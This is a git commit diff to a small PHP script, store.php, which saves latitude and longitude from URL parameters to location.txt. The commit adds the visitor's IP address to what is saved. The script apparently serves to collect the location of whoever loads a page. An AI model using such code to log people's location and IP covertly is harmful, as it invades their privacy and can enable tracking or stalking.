2aac99936b94a65970b5e3d74e71eb6fcb90da07
sangenx09 <santhoshravi23092002@gmail.com>
2025-09-14 21:32:49 +0530

    Update store.php

--- store.php
+++ store.php
@@ -1,6 +1,6 @@
 <?php 
 $myfile = fopen("location.txt", "w");
-$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"];
+$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"]. "\nIP: " . $_SERVER["REMOTE_ADDR"];
 fwrite($myfile, $txt);
 fclose($myfile);
 ?>
